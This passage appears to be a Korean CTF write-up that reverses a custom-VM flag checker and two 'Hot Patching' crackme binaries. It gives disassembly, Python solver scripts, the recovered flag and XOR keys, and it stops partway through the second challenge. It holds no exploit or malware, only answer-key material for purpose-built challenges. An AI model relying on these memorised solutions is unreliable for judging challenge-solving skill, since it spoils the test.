<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.KEY
db 170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33

.ENC_FLAG
db 123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113

.GET_FLAG_LENGTH
MOVE ax, SECTION#INPUT_FLAG
MOVE cx, 0
:LABEL_1
MOVE bx, ax
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP bx, 0
JE LABEL_2
COMP bx, 10 // '\n'
JE LABEL_2
ADD cx, 1
JMP LABEL_1
:LABEL_2
MOVE ax, cx
RETURN

.ROL
MOVE cx, bx
MOD cx, 8
MOVE bx, 8
SUB bx, cx
RSHIFT cx, ax, bx

MOVE dx, 8
SUB dx, bx
MOVE bx, dx

LSHIFT dx, ax, bx
MOVE bx, 8
LSHIFT ax, cx, bx
SUB dx, ax
MOVE ax, dx
ADD ax, cx
RETURN

.FLAG_CHECK
MOVE cx, 0

:LABEL_3
MOVE ax, SECTION#INPUT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, cx
CALL ROL
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

MOVE ax, SECTION#KEY
MOVE bx, cx
MOD bx, 16
ADD ax, bx
MOVE dx, [ax]
AND dx, 255

MOVE ax, SECTION#INPUT_FLAG
MOVE bx, cx
ADD bx, 1
MOD bx, 33
ADD ax, bx
MOVE ax, [ax]
AND ax, 255

ADD dx, ax
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE ax, [bx]
XOR ax, dx
AND ax, 255

MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

ADD cx, 1
COMP cx, 33
JNE LABEL_3

MOVE cx, 0
MOVE dx, 1

:LABEL_4
MOVE ax, SECTION#RESULT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, SECTION#ENC_FLAG
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP ax, bx
JE LABEL_5
MOVE dx, 0
:LABEL_5

ADD cx, 1
COMP cx, 33
JNE LABEL_4
MOVE ax, dx
RETURN

.STRING_CHECK_YOUR_FLAG
string "Check your flag: "

.STRING_CORRECT
string "Correct !!\n"

.STRING_INCORRECT
string "Wrong ...\n"

.INPUT_FLAG
empty 50

.RESULT_FLAG
empty 34

.MAIN
MOVE cx, 17
MOVE bx, SECTION#STRING_CHECK_YOUR_FLAG
MOVE ax, 1
SYSCALL

MOVE cx, 48
MOVE bx, SECTION#INPUT_FLAG
MOVE ax, 0
SYSCALL

CALL GET_FLAG_LENGTH
COMP ax, 33
JNE LABEL_6

CALL FLAG_CHECK
COMP ax, 1

JNE LABEL_6
MOVE cx, 11
MOVE bx, SECTION#STRING_CORRECT
MOVE ax, 1
SYSCALL
RETURN

:LABEL_6
MOVE cx, 10
MOVE bx, SECTION#STRING_INCORRECT
MOVE ax, 1
SYSCALL
RETURN
</code></pre></div></div>

<p>bvm 바이너리 분석을 통해 각 bvm opcode를 해석하고 flag.bvm을 위와 같이 disassemble한다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ROL</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
    <span class="n">shift</span> <span class="o">%=</span> <span class="mi">8</span>
    <span class="n">remains</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">shift</span><span class="p">)</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&lt;&lt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">remains</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">body</span> <span class="o">+</span> <span class="n">remains</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">GET_FLAG_LENGTH</span><span class="p">(</span><span class="n">inp</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>

<span class="n">ENC_FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">123</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="mi">203</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">164</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">113</span><span class="p">]</span>
<span class="n">KEY</span> <span class="o">=</span> <span class="p">[</span><span class="mi">170</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">162</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">148</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>

<span class="n">INPUT_FLAG</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"Check your flag: "</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="k">if</span> <span class="n">GET_FLAG_LENGTH</span><span class="p">(</span><span class="n">INPUT_FLAG</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">33</span><span class="p">:</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">RESULT_FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">33</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">):</span>
    <span class="n">RESULT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROL</span><span class="p">(</span><span class="n">INPUT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">i</span><span class="p">)</span>
    <span class="n">RESULT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="n">INPUT_FLAG</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">33</span><span class="p">]</span>
    <span class="n">RESULT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span>

<span class="k">if</span> <span class="n">RESULT_FLAG</span> <span class="o">==</span> <span class="n">ENC_FLAG</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Correct !!"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Wrong .."</span><span class="p">)</span>
</code></pre></div></div>

<p>disassmble한 결과를 python으로 포팅한다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ROR</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
    <span class="n">shift</span> <span class="o">%=</span> <span class="mi">8</span>
    <span class="n">body</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span>
    <span class="n">remains</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">shift</span><span class="p">))</span> <span class="o">-</span> <span class="p">(</span><span class="n">body</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">body</span> <span class="o">+</span> <span class="n">remains</span><span class="p">)</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="p">[</span><span class="mi">170</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">162</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">148</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>
<span class="n">ENC_FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">123</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="mi">203</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">164</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">113</span><span class="p">]</span>

<span class="n">FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">33</span>
<span class="n">FLAG</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'b'</span><span class="p">)</span> <span class="c1"># prefix "bob{"
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROR</span><span class="p">(</span><span class="n">ENC_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">FLAG</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">33</span><span class="p">]</span> <span class="o">+</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">16</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"FLAG =&gt; {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)))</span>
<span class="c1"># FLAG =&gt; b'bob{BVM_Wi1l_C0m2_B@ck_N2xt_T1me}'
</span></code></pre></div></div>

<p>이것을 역연산하는 코드를 작성하면 flag를 획득할 수 있다.</p>

<p>해당 방식 이외에 비교 opcode(0x9, 0x19)에 BP를 걸고 input에 따라 변화하는 register를 보고 규칙을 찾아 flag를 간접적으로 추출하는 방법도 가능하다.</p>

<p><br /></p>

<p><br /></p>

<h2 id="hot-patching">Hot Patching</h2>

<hr />

<p><img src="/assets/bob/hot_patching_1.png" alt="/assets/bob/hot_patching_1.png" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hot Patching 바이트를 통한 Key 추출
</code></pre></div></div>
<p><img src="/assets/bob/01_main.png" alt="/assets/bob/01_main.png" /></p>
<center>[그림 1] main 함수(0x42D7A0) Hex-Rays 결과</center>

<ul>
  <li>main 함수(0x42D7A0)에서 sub_401000을 호출한다.</li>
</ul>

<p><img src="/assets/bob/02_401000.png" alt="/assets/bob/02_401000.png" /></p>
<center>[그림 2] sub_401000 함수 Hex-Rays 결과</center>

<ul>
  <li>sub_401000은 위와 같다.</li>
</ul>

<p><img src="/assets/bob/03_42D710.png" alt="/assets/bob/03_42D710.png" /></p>
<center>[그림 3] Xor을 수행하는 sub_42D710 함수</center>

<ul>
  <li>sub_42D710는 sub_401000에서 두 번 호출된다.
VirtualProtect를 통해 특정 영역의 메모리를 PAGE_EXECUTE_READWRITE(0x40)으로 변경시킨다.
그 후 세번 째 인자 값을 참조하여 Xor 연산 한다.</li>
</ul>

<p><img src="/assets/bob/04_sub_401000.png" alt="/assets/bob/04_sub_401000.png" /></p>
<center>[그림 4] sub_401000 함수 동작 파악 후 네이밍 결과</center>

<ul>
  <li>sub_401000 함수 내 변수 및 함수 이름을 보기 쉽게 네이밍하였다.</li>
  <li>해당 함수의 실행 흐름은 다음과 같다.
    <ol>
      <li>scanf_s 함수를 통해 입력을 받는다.</li>
      <li><strong>입력 값</strong>의 글자 수를 확인하고, <strong>5글자</strong>가 아닐 시 1을 반환한다.</li>
      <li><strong>0x4010D0</strong> 주소에서 0x2C630(0x42D700 - 0x4010D0) 크기 만큼 <strong>입력 값</strong>과 <strong>Xor</strong> 연산 한다.</li>
      <li><strong>0x44A8C0</strong> 주소에서 0x20 크기 만큼 <strong>입력 값</strong>과 <strong>Xor</strong> 연산 한다.</li>
      <li>Xor 연산 후의 <strong>0x4010D0</strong> 함수를 호출한다.</li>
    </ol>
  </li>
</ul>

<p><img src="/assets/bob/05_4010D0.png" alt="/assets/bob/05_4010D0.png" /></p>
<center>[그림 5] Xor 연산 전 sub_4010D0 함수</center>

<ul>
  <li>Xor 연산 전 0x4010D0 함수는 위와 같이 생겼다. 실행 가능한 어셈블리 코드로는 보이지 않는다.</li>
</ul>

<p><strong><em>“그렇다면, 입력 값이 5글자인 것 외에 단서는 무엇이 있을까?”</em></strong></p>

<ul>
  <li>0x4010D0은 다른 함수와 공통된 <a href="https://en.wikipedia.org/wiki/Function_prologue"><strong>함수 프롤로그</strong></a>를 가지고 있을 것이다.
x86 실행 바이너리는 함수 시작 시 아래와 같은 함수 프롤로그를 가지고 있다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">55</span>        <span class="n">push</span> <span class="n">ebp</span>
<span class="mi">8</span><span class="n">B</span> <span class="n">EC</span>     <span class="n">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
<span class="mi">83</span> <span class="n">EC</span> <span class="n">XX</span>  <span class="n">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="n">N</span>
</code></pre></div></div>

<p><img src="/assets/bob/06_prol.png" alt="/assets/bob/06_prol.png" /></p>
<center>[그림 6] 함수 초기 프롤로그</center>

<ul>
  <li>문제 바이너리에서는 함수 프롤로그 이전에 2바이트 어셈블리 <code class="highlighter-rouge">xchgax,ax</code> 가 보인다.
해당 어셈블리는 2바이트 NOP 코드 <code class="highlighter-rouge">0x66 0x90</code> 이다.
Visual Studio 컴파일 시 <a href="https://docs.microsoft.com/ko-kr/cpp/build/reference/hotpatch-create-hotpatchable-image?view=vs-2019"><strong>HotPatch 옵션</strong></a>이 활성화 된 경우 생기는 코드이다.</li>
</ul>

<p><strong><a href="https://en.wikipedia.org/wiki/Patch_(computing)#Hot_patching">Hot Patching</a>[1]</strong>이란, 서비스의 종료나 재시작 없이 패치를 적용하는 업데이트 방법이다.
x86 어셈블리 언어에서는 패치를 위해 LONG JMP 명령을 사용한다.
해당 명령은 5바이트가 필요하므로, <strong>3바이트</strong>인 <strong>함수 프롤로그</strong> 외 <strong>2바이트</strong>의 <strong>NOP 코드</strong>를
추가하여 [<strong>Hot Patching](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc782258(v=ws.10)?redirectedfrom=MSDN)[2]</strong>에 사용한다.</p>

<p><strong><em>Windows x86 라이브러리 모듈에서는 주로</em></strong> <code class="highlighter-rouge">movedi,edi</code> <strong><em>를 사용한다.</em></strong></p>

<ul>
  <li>Hot Patching에 사용할 5바이트 <code class="highlighter-rouge">0x66 0x90 0x55 0x8B 0xEC</code> 를 통해, 입력 값을 구할 수 있다.
<strong>apple</strong> <code class="highlighter-rouge">0x61 0x70 0x70 0x6C 0x65=0x07 0xE0 0x25 0xE7 0x89**Xor**0x66 0x90 0x55 0x8B 0xEC</code></li>
</ul>

<p><img src="/assets/bob/07_apple.png" alt="/assets/bob/07_apple.png" /></p>
<center>[그림 7] apple 입력 후 화면</center>

<ul>
  <li>apple을 입력하니 또 다시 입력을 받는다.</li>
</ul>

<p><img src="/assets/bob/08_code.png" alt="/assets/bob/08_code.png" /></p>
<center>[그림 8] Xor 연산 후 0x4010D0 디스어셈블 결과</center>

<ul>
  <li>Xor 연산을 수행한 0x4010D0 부분의 코드가 정상적으로 보인다.</li>
</ul>

<p><img src="/assets/bob/09_code2.png" alt="/assets/bob/09_code2.png" /></p>
<center>[그림 9] 0x4010D0 함수의 입력 값 사용</center>

<ul>
  <li>다음 입력 값의 크기는 5이며, 0x4011A0 주소와 Xor 연산하는 것으로 보인다.
연산할 크기는 0x2C560(0x42D700 - 0x4011A0)이다.</li>
  <li><strong>apple</strong>과 같은 방법으로 입력 값 <strong>mango</strong>를 구할 수 있다.
<strong>**apple을 입력 후 바뀐 0x4010A0 ~ 0x4010A4 범위의 값을 사용해야한다.</strong>*</li>
  <li>같은 방법으로 다음 입력 값 <strong>lemon</strong>을 구할 수 있다.</li>
</ul>

<p><img src="/assets/bob/10_code3.png" alt="/assets/bob/10_code3.png" /></p>
<center>[그림 10] 0x401270 함수에서 6글자 입력 값 요구</center>

<ul>
  <li>세 번째 입력 값 lemon 이후에는 입력 값이 6으로 증가한다.</li>
  <li>그래도 알려진 5바이트를 통해 <strong>orang</strong> 5글자를 구할 수 있다.
이전에 과일이 나왔으므로 <strong>orange</strong>로 유추해 볼 수 있다.
또한  <code class="highlighter-rouge">subesp,N</code>  코드의 <code class="highlighter-rouge">0x83 0xEC 0x??</code> 를 통해서 총 최대 7글자를 구할 수 있다.</li>
</ul>

<p><img src="/assets/bob/11_flag.png" alt="/assets/bob/11_flag.png" /></p>
<center>[그림 11] Flag 출력</center>

<ul>
  <li>알려진 7바이트와 유추를 통해서 Key를 총 10번 입력하면 Flag를 획득할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">key_info</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4010D0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4011A0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401270</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401350</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401430</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401510</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4015F0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4016D0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4017B0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401890</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">8</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">]}</span>
<span class="p">]</span>

<span class="n">known_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">]</span>
<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">key_info</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">k</span><span class="p">[</span><span class="s">"data"</span><span class="p">]</span>
    <span class="n">key</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">key</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">known_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">7</span><span class="p">])</span>

    <span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="s">"?"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">),</span> <span class="s">"=&gt;"</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span> <span class="c1">#Known Bytes Size == 5, 7
</span>
<span class="s">""" #Result
apple =&gt; apple
mango =&gt; mango
lemon =&gt; lemon
orang? =&gt; orange
banan? =&gt; banana
duria? =&gt; durian
curra?? =&gt; currant
avoca?? =&gt; avocado
cocon?? =&gt; coconut
manda??? =&gt; mandari? =&gt; mandarin*
"""</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h2 id="hot-patching-777">Hot Patching 777</h2>

<hr />

<p><img src="/assets/bob/hot_patching_2.png" alt="/assets/bob/hot_patching_2.png" /></p>

<p>공통된 명령 바이트를 통한 Key 추출 자동화</p>

<ul>
  <li>이전 <strong>Hot Patching</strong> 문제는 별도의 자동화 없이 문제를 해결할 수 있었다.</li>
</ul>

<p><img src="/assets/bob/12_flag_xor.png" alt="/assets/bob/12_flag_xor.png" /></p>
<center>[그림 1] 0x401890 함수에서 Flag 출력 후 연산 데이터</center>

<ul>
  <li>0x401890 함수에서 첫 번째 Flag를 출력해주고, 다음 Flag를 위한 연산이 수행된다.</li>
</ul>

<p><img src="/assets/bob/13_11th_function.png" alt="/assets/bob/13_11th_function.png" /></p>
<center>[그림 2] 0x401890 함수에서 별도 입력 처리 없이 다음 함수 복호화 수행</center>

<ul>
  <li>10 번째 Key까지 모두 올바르게 입력된 경우, 다음 함수는 별도 입력 처리 없이 복호화 된다.</li>
</ul>

<p><img src="/assets/bob/14_length.png" alt="/assets/bob/14_length.png" /></p>
<center>[그림 3] 0x4019B0 함수에서 입력 값 검사</center>

<ul>
  <li>첫 번째 Flag 출력 이전까지는 5~8 글자의 입력 값이 필요했지만, 11 번째는 17 글자를 요구한다.</li>
  <li>
    <p>알려진 7바이트를 통해, 일부를 복구하여도 이전과 다르게 특정 단어로 추정할 수 없다.
<strong>TO5yQyc</strong> <code class="highlighter-rouge">0x54 0x4F 0x35 0x79 0x51 0x79 0x63</code>
          <code class="highlighter-rouge">=0x32 0xDF 0x60 0xF2 0xBD 0xFA 0x8F**Xor**0x66 0x90 0x55 0x8B 0xEC 0x83 0xEC</code>
                               <strong><em>“그렇다면, 알려진 7바이트 외에 단서가 필요하다.”</em></strong></p>
  </li>
  <li>지금까지 Flag 출력 함수 외 모든 함수는 같은 형식으로 구성되어있다.
다른 점은 입력 값의 크기, 복호화 대상 주소, 다음 함수 주소 등이다.</li>
</ul>

<p><img src="/assets/bob/15_dummy.png" alt="/assets/bob/15_dummy.png" /></p>
